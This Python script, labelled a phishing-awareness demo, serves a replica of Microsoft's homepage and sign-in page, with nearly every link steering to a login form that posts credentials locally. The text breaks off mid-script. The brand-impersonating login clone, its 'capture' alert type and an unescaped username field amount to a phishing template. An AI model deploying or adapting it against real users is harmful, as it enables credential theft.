#!/usr/bin/env python3
"""\nSAFE AWARENESS DEMO: predefined demo accounts only; submitted passwords are never stored, logged, exported, or transmitted.
CYBERSECURITY AWARENESS DEMO - WITH REALISTIC IMAGES
- Full Microsoft homepage with styled product images
- Demo login system
- Complete navigation with all pages
- Professional product images using CSS gradients
"""

import os
import sys
import json
import sqlite3
import secrets
import csv
import io
import webbrowser
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from typing import Dict, List, Optional

# ======================== DATABASE ========================

class Database:
    """Local demo account database. No submitted passwords are stored."""
    def __init__(self, db_path="awareness_demo.db"):
        self.db_path = db_path
        self.init_db()

    def init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password TEXT NOT NULL,
                    full_name TEXT,
                    email TEXT,
                    is_active INTEGER DEFAULT 1
                )
            """)
            cursor.execute("SELECT COUNT(*) FROM users")
            if cursor.fetchone()[0] == 0:
                cursor.execute("""
                    INSERT INTO users (username, password, full_name, email) VALUES
                    ('student', 'abc123', 'Student User', 'student@uc.edu.kh'),
                    ('admin', 'admin123', 'Administrator', 'admin@uc.edu.kh'),
                    ('library', 'library2024', 'Library Staff', 'library@uc.edu.kh'),
                    ('teacher', 'teacher123', 'Teacher', 'teacher@uc.edu.kh'),
                    ('staff', 'staff123', 'Staff Member', 'staff@uc.edu.kh')
                """)
            conn.commit()

    def verify_user(self, username: str, password: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(
                "SELECT * FROM users WHERE username = ? AND password = ? AND is_active = 1",
                (username, password)
            )
            row = cursor.fetchone()
            return dict(row) if row else None

    def get_users(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute("SELECT id, username, full_name, email, is_active FROM users")
            return [dict(row) for row in cursor.fetchall()]

# ======================== ALERT SYSTEM ========================

class AlertSystem:
    @staticmethod
    def show_alert(message: str, alert_type: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        symbols = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "danger": "🚨"}
        symbol = symbols.get(alert_type, "ℹ️")
        print(f"\n[{timestamp}] {symbol} {message}")
        print("=" * 80)


class AlertSystem:
    @staticmethod
    def show_alert(message: str, alert_type: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        symbols = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "danger": "🚨", "capture": "🎣"}
        symbol = symbols.get(alert_type, "ℹ️")
        print(f"\n[{timestamp}] {symbol} {message}")
        print("="*80)


# ======================== COMPLETE MICROSOFT WEBSITE ========================

class MicrosoftPages:
    """Complete Microsoft website replica with realistic images"""
    
    @staticmethod
    def get_home_page():
        """Full Microsoft homepage with styled images"""
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft – AI, Cloud, Productivity, Computing, Gaming & Apps</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; }
        
        /* Top Bar */
        .top-bar { background: #2b2b2b; padding: 8px 40px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .top-bar .logo { display: flex; align-items: center; gap: 8px; color: white; font-size: 20px; font-weight: 300; text-decoration: none; }
        .top-bar .logo svg { width: 24px; height: 24px; }
        .top-bar .nav-links { display: flex; gap: 24px; align-items: center; flex-wrap: wrap; }
        .top-bar .nav-links a { color: #ccc; text-decoration: none; font-size: 13px; }
        .top-bar .nav-links a:hover { color: white; }
        .top-bar .nav-links .sign-in { background: #0078d4; padding: 6px 16px; border-radius: 4px; color: white; }
        .top-bar .nav-links .sign-in:hover { background: #005a9e; }
        
        /* Hero Banner */
        .hero-banner { background: #e8f0fe; padding: 16px 40px; text-align: center; font-size: 14px; color: #1b1b1b; border-bottom: 1px solid #d0d8e8; }
        .hero-banner a { color: #0078d4; text-decoration: none; font-weight: 600; }
        .hero-banner a:hover { text-decoration: underline; }
        
        /* Main Content */
        .container { max-width: 1600px; margin: 0 auto; padding: 0 40px; }
        
        /* Hero Section */
        .hero { display: flex; align-items: center; padding: 40px 0; gap: 40px; }
        .hero .content { flex: 1; }
        .hero .content .badge { background: #e8f0fe; color: #0078d4; padding: 4px 12px; border-radius: 16px; font-size: 12px; font-weight: 600; display: inline-block; margin-bottom: 12px; }
        .hero .content h1 { font-size: 48px; font-weight: 300; color: #1b1b1b; line-height: 1.2; }
        .hero .content h1 strong { font-weight: 600; }
        .hero .content p { font-size: 18px; color: #444; margin: 16px 0 24px; max-width: 500px; }
        .hero .content .btn { display: inline-block; padding: 12px 32px; background: #0078d4; color: white; text-decoration: none; border-radius: 4px; font-weight: 600; }
        .hero .content .btn:hover { background: #005a9e; }
        .hero .image { flex: 1; max-width: 50%; }
        .hero .image .product-image { 
            border-radius: 12px; 
            padding: 40px; 
            text-align: center; 
            color: white; 
            min-height: 300px; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            position: relative;
            overflow: hidden;
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
        }
        .hero .image .product-image .device-icon { font-size: 120px; margin-bottom: 16px; filter: drop-shadow(0 10px 30px rgba(0,0,0,0.3)); }
        .hero .image .product-image h2 { font-size: 28px; font-weight: 300; }
        .hero .image .product-image p { font-size: 16px; opacity: 0.9; margin-top: 8px; }
        .hero .image .product-image .badge-save { background: rgba(255,215,0,0.2); border: 1px solid rgba(255,215,0,0.3); padding: 4px 16px; border-radius: 20px; font-size: 14px; margin-top: 12px; }
        .hero .image .product-image .glow { position: absolute; width: 300px; height: 300px; background: radial-gradient(circle, rgba(0,120,212,0.2), transparent); border-radius: 50%; top: -50px; right: -50px; }
        .hero .image .product-image .glow2 { position: absolute; width: 200px; height: 200px; background: radial-gradient(circle, rgba(0,200,255,0.15), transparent); border-radius: 50%; bottom: -30px; left: -30px; }
        
        /* Section Title */
        .section-title { font-size: 32px; font-weight: 300; margin: 40px 0 20px; color: #1b1b1b; }
        .section-title strong { font-weight: 600; }
        
        /* Product Grid */
        .product-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px; margin-bottom: 40px; }
        .product-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.08); transition: transform 0.2s, box-shadow 0.2s; cursor: pointer; }
        .product-card:hover { transform: translateY(-4px); box-shadow: 0 8px 24px rgba(0,0,0,0.12); }
        .product-card .card-image { 
            min-height: 200px; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            position: relative;
            padding: 20px;
        }
        .product-card .card-image .product-img { 
            font-size: 80px; 
            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.1));
        }
        .product-card .card-image .tag { 
            position: absolute; 
            top: 12px; 
            right: 12px; 
            padding: 4px 14px; 
            border-radius: 20px; 
            font-size: 11px; 
            font-weight: 700; 
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .product-card .card-image .tag.blue { background: #0078d4; color: white; }
        .product-card .card-image .tag.green { background: #2ecc71; color: white; }
        .product-card .card-image .tag.orange { background: #f39c12; color: white; }
        .product-card .card-image .tag.purple { background: #9b59b6; color: white; }
        .product-card .card-image .tag.red { background: #e74c3c; color: white; }
        .product-card .card-image .tag.pink { background: #e84393; color: white; }
        .product-card .card-image .tag.teal { background: #00b894; color: white; }
        .product-card .card-image .bg-gradient1 { background: linear-gradient(135deg, #667eea, #764ba2); }
        .product-card .card-image .bg-gradient2 { background: linear-gradient(135deg, #f093fb, #f5576c); }
        .product-card .card-image .bg-gradient3 { background: linear-gradient(135deg, #4facfe, #00f2fe); }
        .product-card .card-image .bg-gradient4 { background: linear-gradient(135deg, #43e97b, #38f9d7); }
        .product-card .card-image .bg-gradient5 { background: linear-gradient(135deg, #fa709a, #fee140); }
        .product-card .card-image .bg-gradient6 { background: linear-gradient(135deg, #a18cd1, #fbc2eb); }
        .product-card .card-image .bg-gradient7 { background: linear-gradient(135deg, #fccb90, #d57eeb); }
        .product-card .card-image .bg-gradient8 { background: linear-gradient(135deg, #89f7fe, #66a6ff); }
        .product-card .card-body { padding: 20px; }
        .product-card .card-body h3 { font-size: 18px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; }
        .product-card .card-body p { font-size: 14px; color: #666; line-height: 1.6; }
        .product-card .card-body .link { display: inline-block; color: #0078d4; text-decoration: none; font-weight: 600; margin-top: 12px; }
        .product-card .card-body .link:hover { text-decoration: underline; }
        
        /* Gaming Section */
        .gaming-section { background: #f8f9fa; padding: 40px 0; margin: 40px 0; }
        .gaming-section .container { padding: 0 40px; }
        .gaming-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px; }
        
        /* AI Section */
        .ai-section { padding: 40px 0; }
        .ai-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px; }
        .ai-card { background: #f8f9fa; border-radius: 12px; padding: 24px; transition: transform 0.2s; cursor: pointer; border: 1px solid #e8e8e8; }
        .ai-card:hover { transform: translateY(-4px); box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
        .ai-card .icon-box { 
            width: 56px; 
            height: 56px; 
            border-radius: 12px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 28px;
            margin-bottom: 12px;
        }
        .ai-card .icon-box.blue { background: #dbeafe; }
        .ai-card .icon-box.green { background: #d1fae5; }
        .ai-card .icon-box.purple { background: #ede9fe; }
        .ai-card .icon-box.orange { background: #fef3c7; }
        .ai-card h3 { font-size: 18px; font-weight: 600; color: #1b1b1b; margin-bottom: 8px; }
        .ai-card p { font-size: 14px; color: #666; line-height: 1.6; }
        .ai-card .link { display: inline-block; color: #0078d4; text-decoration: none; font-weight: 600; margin-top: 12px; }
        .ai-card .link:hover { text-decoration: underline; }
        
        /* Powering Section */
        .powering-section { padding: 40px 0; }
        .powering-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px; }
        
        /* Footer */
        .footer { background: #2b2b2b; color: #aaa; padding: 40px 40px 20px; margin-top: 40px; }
        .footer .footer-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 30px; max-width: 1600px; margin: 0 auto; }
        .footer .footer-grid h4 { color: white; font-weight: 400; margin-bottom: 12px; font-size: 14px; }
        .footer .footer-grid a { display: block; color: #aaa; text-decoration: none; font-size: 13px; margin-bottom: 6px; }
        .footer .footer-grid a:hover { color: white; }
        .footer .bottom { border-top: 1px solid #444; margin-top: 30px; padding-top: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 12px; font-size: 12px; }
        .footer .bottom a { color: #aaa; text-decoration: none; margin-left: 16px; }
        .footer .bottom a:hover { color: white; }
        .footer .chat { background: #0078d4; color: white; padding: 12px 24px; border-radius: 4px; text-decoration: none; display: inline-block; margin-bottom: 20px; }
        .footer .chat:hover { background: #005a9e; }
        
        @media (max-width: 768px) {
            .top-bar { padding: 8px 20px; }
            .container { padding: 0 20px; }
            .hero { flex-direction: column; padding: 20px 0; }
            .hero .image { max-width: 100%; }
            .hero .content h1 { font-size: 32px; }
            .section-title { font-size: 24px; }
            .footer { padding: 30px 20px; }
            .gaming-section .container { padding: 0 20px; }
            .product-grid { grid-template-columns: 1fr; }
            .gaming-grid { grid-template-columns: 1fr; }
            .ai-grid { grid-template-columns: 1fr; }
            .powering-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <!-- Top Navigation -->
    <div class="top-bar">
        <a href="/" class="logo">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            Microsoft
        </a>
        <div class="nav-links">
            <a href="/microsoft365">Microsoft 365</a>
            <a href="/outlook">Outlook</a>
            <a href="/onedrive">OneDrive</a>
            <a href="/teams">Teams</a>
            <a href="/sharepoint">SharePoint</a>
            <a href="/login" class="sign-in">Sign in</a>
        </div>
    </div>

    <!-- Hero Banner -->
    <div class="hero-banner">
        🎓 There's still time to gear up for class—students save up to 10% on select Surface and more. 
        <a href="#">Shop now →</a>
    </div>

    <!-- Main Content -->
    <div class="container">
        <!-- Hero Section -->
        <div class="hero">
            <div class="content">
                <span class="badge">✨ New</span>
                <h1>Hi there, <strong>welcome to Microsoft</strong></h1>
                <p>Find what you need faster with AI-powered suggestions</p>
                <a href="/login" class="btn">Get started</a>
            </div>
            <div class="image">
                <div class="product-image">
                    <div class="glow"></div>
                    <div class="glow2"></div>
                    <div class="device-icon">🚀</div>
                    <h2>Microsoft AI</h2>
                    <p>Your productivity, supercharged</p>
                    <div class="badge-save">✨ AI-powered</div>
                </div>
            </div>
        </div>

        <!-- Your productivity, supercharged -->
        <h2 class="section-title">Your productivity, <strong>supercharged</strong></h2>
        <div class="product-grid">
            <div class="product-card" onclick="window.location.href='/microsoft365'">
                <div class="card-image bg-gradient1">
                    <div class="product-img">📦</div>
                    <span class="tag blue">New</span>
                </div>
                <div class="card-body">
                    <h3>Microsoft 365</h3>
                    <p>Microsoft 365 delivers cloud storage, advanced security, and Microsoft Copilot in your favorite apps—all in one plan.</p>
                    <a href="/microsoft365" class="link">Learn more →</a>
                </div>
            </div>
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient2">
                    <div class="product-img">💻</div>
                    <span class="tag green">Save $100</span>
                </div>
                <div class="card-body">
                    <h3>Surface Pro</h3>
                    <p>Save up to $100.00 on Surface Pro, Copilot+ PC, 12-inch. Awarded 2025 Esquire Best Tablet.</p>
                    <a href="/login" class="link">Shop now →</a>
                </div>
            </div>
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient3">
                    <div class="product-img">🖥️</div>
                    <span class="tag orange">Save $300</span>
                </div>
                <div class="card-body">
                    <h3>Surface Laptop</h3>
                    <p>Save up to $300.00 on select Surface Laptop. All-day battery life and supercharged productivity.</p>
                    <a href="/login" class="link">Shop now →</a>
                </div>
            </div>
        </div>

        <!-- Accessories -->
        <h2 class="section-title">Keyboards, mice, and <strong>more</strong></h2>
        <div class="product-grid">
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient4">
                    <div class="product-img">⌨️</div>
                    <span class="tag purple">Accessories</span>
                </div>
                <div class="card-body">
                    <h3>Surface Accessories</h3>
                    <p>Customize your setup with accessories designed for Surface.</p>
                    <a href="/login" class="link">Shop now →</a>
                </div>
            </div>
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient5">
                    <div class="product-img">🖱️</div>
                    <span class="tag pink">New</span>
                </div>
                <div class="card-body">
                    <h3>Surface Mouse</h3>
                    <p>Precision and comfort for your everyday work.</p>
                    <a href="/login" class="link">Shop now →</a>
                </div>
            </div>
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient6">
                    <div class="product-img">🎧</div>
                    <span class="tag teal">Wireless</span>
                </div>
                <div class="card-body">
                    <h3>Surface Headphones</h3>
                    <p>Immersive sound with noise cancellation.</p>
                    <a href="/login" class="link">Shop now →</a>
                </div>
            </div>
        </div>

        <!-- Gaming Section -->
        <div class="gaming-section">
            <div class="container">
                <h2 class="section-title">Gaming <strong>experiences</strong></h2>
                <div class="gaming-grid">
                    <div class="product-card" onclick="window.location.href='/login'">
                        <div class="card-image bg-gradient7">
                            <div class="product-img">🎮</div>
                            <span class="tag red">Best Seller</span>
                        </div>
                        <div class="card-body">
                            <h3>XBOX Wireless Controller</h3>
                            <p>Stay on target with textured triggers and bumpers, a hybrid D-pad, customizable button mapping, and more.</p>
                            <a href="/login" class="link">Shop now →</a>
                        </div>
                    </div>
                    <div class="product-card" onclick="window.location.href='/login'">
                        <div class="card-image bg-gradient8">
                            <div class="product-img">🎯</div>
                            <span class="tag green">Play Now</span>
                        </div>
                        <div class="card-body">
                            <h3>XBOX Game Pass</h3>
                            <p>Play hundreds of games from every genre—on XBOX console, PC, and more.</p>
                            <a href="/login" class="link">Join now →</a>
                        </div>
                    </div>
                    <div class="product-card" onclick="window.location.href='/login'">
                        <div class="card-image bg-gradient1">
                            <div class="product-img">🔄</div>
                            <span class="tag orange">Up to $180</span>
                        </div>
                        <div class="card-body">
                            <h3>Trade in your console</h3>
                            <p>Trade in and get up to $180 for your used console. Buy a new XBOX Series X or S and get cash back.</p>
                            <a href="/login" class="link">Learn more →</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- AI Built for Work -->
        <h2 class="section-title">AI built <strong>for work</strong></h2>
        <div class="product-grid">
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient2">
                    <div class="product-img">🤖</div>
                    <span class="tag blue">Copilot</span>
                </div>
                <div class="card-body">
                    <h3>Microsoft 365 Copilot</h3>
                    <p>Turn data into insights in the apps you already know with Microsoft 365 Copilot.</p>
                    <a href="/login" class="link">Learn more →</a>
                </div>
            </div>
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient3">
                    <div class="product-img">💼</div>
                    <span class="tag purple">Business</span>
                </div>
                <div class="card-body">
                    <h3>Surface for Business</h3>
                    <p>Fast performance for demanding apps, all-day battery life, and built-in security.</p>
                    <a href="/login" class="link">Shop now →</a>
                </div>
            </div>
            <div class="product-card" onclick="window.location.href='/login'">
                <div class="card-image bg-gradient4">
                    <div class="product-img">🔒</div>
                    <span class="tag green">Security</span>
                </div>
                <div class="card-body">
                    <h3>Project Perception</h3>
                    <p>Defend continuously with an agentic security system that helps your team find and respond to risk.</p>
                    <a href="/login" class="link">Learn more →</a>
                </div>
            </div>
        </div>

        <!-- AI Section -->
        <div class="ai-section">
            <h2 class="section-title">Get to know <strong>AI and Copilot</strong></h2>
            <div class="ai-grid">
                <div class="ai-card" onclick="window.location.href='/login'">
                    <div class="icon-box blue">📊</div>
                    <h3>Advancing AI Governance</h3>
                    <p>Microsoft released the 2026 Responsible AI Transparency Report—outlining our commitment to responsibly build and deploy AI.</p>
                    <a href="/login" class="link">Read the report →</a>
                </div>
                <div class="ai-card" onclick="window.location.href='/login'">
                    <div class="icon-box green">🐋</div>
                    <h3>Protecting endangered orcas</h3>
                    <p>Discover how Microsoft AI and bioacoustics help protect endangered orca whales by detecting underwater noise.</p>
                    <a href="/login" class="link">Learn more →</a>
                </div>
                <div class="ai-card" onclick="window.location.href='/login'">
                    <div class="icon-box purple">🤖</div>
                    <h3>Build an AI agent</h3>
                    <p>Our simple guide walks you through the key steps to go from idea to working prototype without writing any code.</p>
                    <a href="/login" class="link">Get started →</a>
                </div>
            </div>
        </div>

        <!-- Powering Section -->
        <div class="powering-section">
            <h2 class="section-title">Powering <strong>every play</strong></h2>
            <div class="powering-grid">
                <div class="product-card" onclick="window.location.href='/login'">
                    <div class="card-image bg-gradient5">
                        <div class="product-img">🏈</div>
                        <span class="tag purple">NFL</span>
                    </div>
                    <div class="card-body">
                        <h3>NFL + Microsoft</h3>
                        <p>For the NFL, greatness starts in the preparation—and Viper on Azure helps everything align weeks before game day.</p>
                        <a href="/login" class="link">Learn more →</a>
                    </div>
                </div>
                <div class="product-card" onclick="window.location.href='/login'">
                    <div class="card-image bg-gradient6">
                        <div class="product-img">🎯</div>
                        <span class="tag green">Sports</span>
                    </div>
                    <div class="card-body">
                        <h3>Chasing the perfect shot</h3>
                        <p>Shoot 360 turns data from more than 600 million shots into instant feedback, helping players fine-tune their game.</p>
                        <a href="/login" class="link">Learn more →</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div style="max-width:1600px;margin:0 auto;">
            <a href="#" class="chat">💬 Need help? Let's chat</a>
            <div style="font-size:13px;color:#aaa;margin-bottom:20px;">Store Assistant is available 24/7.</div>
        </div>
        <div class="footer-grid">
            <div>
                <h4>What's new</h4>
                <a href="#">Microsoft Copilot</a>
                <a href="#">Surface Pro</a>
                <a href="#">Windows 11</a>
            </div>
            <div>
                <h4>Microsoft Store</h4>
                <a href="#">Account profile</a>
                <a href="#">Returns</a>
                <a href="#">Order tracking</a>
            </div>
            <div>
                <h4>Education</h4>
                <a href="#">Microsoft Education</a>
                <a href="#">Devices for education</a>
                <a href="#">Microsoft Teams for Education</a>
            </div>
            <div>
                <h4>Enterprise</h4>
                <a href="#">Microsoft 365</a>
                <a href="#">Azure</a>
                <a href="#">Industry solutions</a>
            </div>
            <div>
                <h4>Developer</h4>
                <a href="#">Microsoft Developer</a>
                <a href="#">Documentation</a>
                <a href="#">GitHub</a>
            </div>
            <div>
                <h4>Company</h4>
                <a href="#">Careers</a>
                <a href="#">About Microsoft</a>
                <a href="#">Investors</a>
            </div>
        </div>
        <div class="bottom">
            <div>
                <a href="/">English (United States)</a>
                <a href="#">Your Privacy Choices</a>
            </div>
            <div>
                <a href="#">Privacy</a>
                <a href="#">Terms of use</a>
                <a href="#">Trademarks</a>
                <a href="#">About our ads</a>
                <span style="color: #666;">© 2026 Microsoft</span>
            </div>
        </div>
    </div>
</body>
</html>'''

    @staticmethod
    def get_login_page(error=None, attempt=None, max_attempts=3, username_value=""):
        """Microsoft login page"""
        
        error_html = ''
        if error:
            error_html = f'''
            <div id="errorMessage" style="background:#fde7e9;color:#a4262c;padding:10px 14px;border-radius:2px;margin-bottom:16px;border-left:4px solid #a4262c;font-size:14px;display:block;">
                <span style="margin-right:8px;">&#9888;</span>
                {error}
            </div>
            '''
        
        attempt_html = ''
        if attempt:
            remaining = max_attempts - attempt
            if remaining > 0:
                attempt_html = f'''
                <div style="text-align:center;padding:10px;margin-top:10px;background:#fff8e1;border-radius:4px;border:1px solid #ffe082;font-size:13px;">
                    <span style="font-weight:600;color:#e65100;">Attempt {attempt} of {max_attempts}</span>
                    <span style="color:#666;margin-left:10px;">🔒 {remaining} attempt(s) remaining</span>
                </div>
                '''
            else:
                attempt_html = '''
                <div style="text-align:center;padding:10px;margin-top:10px;background:#e8f5e9;border-radius:4px;border:1px solid #a5d6a7;font-size:13px;">
                    <span style="font-weight:600;color:#2e7d32;">✅ Login successful!</span>
                    <span style="color:#666;margin-left:10px;">Redirecting...</span>
                </div>
                '''
        
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Segoe UI Web', 'Helvetica Neue', Arial, sans-serif;
        }}
        body {{
            background: #f1f5f9;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .back-link {{
            position: fixed;
            top: 20px;
            left: 20px;
            color: #005a9e;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }}
        .back-link:hover {{
            text-decoration: underline;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .header .logo {{
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 24px;
            color: #1b1b1b;
            font-weight: 400;
            margin-bottom: 4px;
            text-decoration: none;
        }}
        .header .logo svg {{
            width: 28px;
            height: 28px;
        }}
        .header .tagline {{
            color: #5e5e5e;
            font-size: 14px;
            font-weight: 300;
            letter-spacing: 0.5px;
        }}
        .login-container {{
            background: white;
            border-radius: 8px;
            padding: 44px 40px 36px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
        }}
        .login-container h1 {{
            font-size: 24px;
            font-weight: 400;
            color: #1b1b1b;
            margin-bottom: 4px;
        }}
        .login-container .subtitle {{
            font-size: 14px;
            color: #5e5e5e;
            margin-bottom: 24px;
            font-weight: 300;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        .form-group label {{
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 6px;
        }}
        .form-group input {{
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #8c8c8c;
            border-radius: 2px;
            font-size: 15px;
            transition: border-color 0.15s, box-shadow 0.15s;
        }}
        .form-group input:focus {{
            border-color: #005a9e;
            outline: none;
            box-shadow: 0 0 0 2px rgba(0,90,158,0.15);
        }}
        .form-group input.error {{
            border-color: #a4262c;
        }}
        .form-options {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 12px 0 20px;
            font-size: 13px;
        }}
        .form-options label {{
            display: flex;
            align-items: center;
            gap: 6px;
            color: #1b1b1b;
            font-weight: 400;
            cursor: pointer;
        }}
        .form-options label input[type="checkbox"] {{
            width: 16px;
            height: 16px;
            accent-color: #005a9e;
            cursor: pointer;
        }}
        .form-options a {{
            color: #005a9e;
            text-decoration: none;
            font-weight: 400;
        }}
        .form-options a:hover {{
            text-decoration: underline;
        }}
        .btn {{
            width: 100%;
            padding: 12px;
            background: #005a9e;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.15s;
            height: 48px;
        }}
        .btn:hover {{
            background: #004578;
        }}
        .btn:disabled {{
            opacity: 0.6;
            cursor: not-allowed;
        }}
        .loading-container {{
            display: none;
            text-align: center;
            padding: 16px 0;
        }}
        .spinner {{
            border: 3px solid #f3f3f3;
            border-top: 3px solid #005a9e;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .loading-container p {{
            color: #5e5e5e;
            font-size: 14px;
        }}
        .divider {{
            display: flex;
            align-items: center;
            margin: 24px 0 20px;
            color: #666;
            font-size: 13px;
        }}
        .divider::before,
        .divider::after {{
            content: '';
            flex: 1;
            border-bottom: 1px solid #e0e0e0;
        }}
        .divider::before {{
            margin-right: 15px;
        }}
        .divider::after {{
            margin-left: 15px;
        }}
        .signup-link {{
            text-align: center;
            margin: 12px 0 16px;
        }}
        .signup-link a {{
            color: #005a9e;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
        }}
        .signup-link a:hover {{
            text-decoration: underline;
        }}
        .footer-links {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
            font-size: 12px;
        }}
        .footer-links a {{
            color: #666;
            text-decoration: none;
        }}
        .footer-links a:hover {{
            text-decoration: underline;
            color: #005a9e;
        }}
        @media (max-width: 480px) {{
            .login-container {{
                padding: 32px 20px 28px;
            }}
            .login-container h1 {{
                font-size: 20px;
            }}
            .form-options {{
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }}
            .back-link {{
                position: static;
                margin-bottom: 16px;
            }}
        }}
    </style>
</head>
<body>
    <a href="/" class="back-link">← Back to Microsoft</a>
    
    <div class="header">
        <a href="/" class="logo">
            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
                <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
            </svg>
            Microsoft
        </a>
        <div class="tagline">– AI, Cloud, Productivity</div>
    </div>

    <div class="login-container">
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Microsoft services</p>

        {error_html}

        <form id="loginForm" method="POST" action="/login">
            <div class="form-group">
                <label for="username">Email, phone, or Skype</label>
                <input type="text" id="username" name="username" placeholder="Enter your email, phone, or Skype" required autocomplete="off" value="{username_value}">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="form-options">
                <label>
                    <input type="checkbox" checked> Keep me signed in
                </label>
                <a href="#">Can't access your account?</a>
            </div>

            <button type="submit" class="btn" id="loginBtn">Sign in</button>
        </form>

        <div class="loading-container" id="loadingDiv">
            <div class="spinner"></div>
            <p>Signing you in...</p>
        </div>

        {attempt_html}

        <div class="divider">or</div>
        
        <div class="signup-link">
            <a href="#">Create a new account</a>
        </div>

        <div class="footer-links">
            <a href="#">Forgot password?</a>
            <a href="#">Help</a>
            <a href="#">Privacy & cookies</a>
            <a href="#">Terms of use</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            var errorDiv = document.getElementById('errorMessage');
            var loadingDiv = document.getElementById('loadingDiv');
            var loginBtn = document.getElementById('loginBtn');
            var password = document.getElementById('password');
            
            if (errorDiv) {{
                errorDiv.style.display = 'none';
            }}
            loadingDiv.style.display = 'block';
            loginBtn.disabled = true;
            loginBtn.textContent = 'Signing in...';
            
            var formData = new FormData(this);
            var urlEncoded = new URLSearchParams(formData);
            
            fetch('/login', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                body: urlEncoded
            }})
            .then(response => response.json())
            .then(data => {{
                loadingDiv.style.display = 'none';
                loginBtn.disabled = false;
                loginBtn.textContent = 'Sign in';
                
                if (data.status === 'success') {{
                    var successMsg = document.createElement('div');
